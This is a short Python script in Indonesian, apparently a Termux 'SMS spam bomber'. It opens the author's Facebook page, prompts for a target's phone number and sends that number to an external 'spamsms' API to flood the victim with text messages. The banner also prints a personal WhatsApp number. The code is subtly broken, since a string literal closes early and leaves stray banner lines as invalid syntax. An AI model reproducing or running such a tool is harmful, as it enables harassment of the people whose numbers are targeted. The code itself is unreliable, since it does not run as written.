import requests
import time,os,sys,time,requests
from time import sleep

a,m,h,k,b,u,c,p,bn,o = [
'\033[90m',
'\033[31m',
'\033[32m',
'\033[33m',
'\033[94m',
'\033[35m',
'\033[36m',
'\033[37m',
'\033[41m',
'\033[0m'
]

#logo
os.system('clear')
print ('\033[36mFollow Facebook Gw Dulu Bang \033[37mSapa Yah \033[36mok! :v')
os.system('termux-open-url https://www.facebook.com/profile.php?id=100078919720019')
sleep(4)
banner =("""
\033[37m    ____  ____  __  ___  \033[94m   _____ __  ________
\033[37m   / __ )/ __ \/  |/  /  \033[94m  / ___//  |/  / ___/
\033[37m  / __  / / / / /|_/ /   \033[94m  \__ \/ /|_/ /\__ \
\033[37m / /_/ / /_/ / /  / /    \033[94m  __/ / /  / /___/ /
\033[37m/_____/\____/_/  /_/     \033[94m/____/_/  /_//____/
""")
\033[32m[•]───────────────────────────────────────────[•]
\033[32m | \033[94m[+]  \033[32mAuthor  : \033[35mXenz-11                     \033[32m |
\033[32m | \033[33m[+]  \033[32mFb      : \033[33mXenz Why                    \033[32m |
\033[32m | \033[35m[+]  \033[32mWa      : \033[35m083138613993                \033[32m |
\033[32m[•]───────────────────────────────────────────[•]"""
os.system('clear')
print (banner)

print
print ('\033[31mNomor awali dari : \033[94m 8xxxx')


#Run nomor

nomor = input(' \033[33mNomor target lu Bang?:\033[90m ')
req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
if 'terkirim' in req:
     print (' \033[32m[√] \033[94mspam berhasil :) ')
else:
     print (' \033[31m[¡] \033[94mspam gagal :( ')
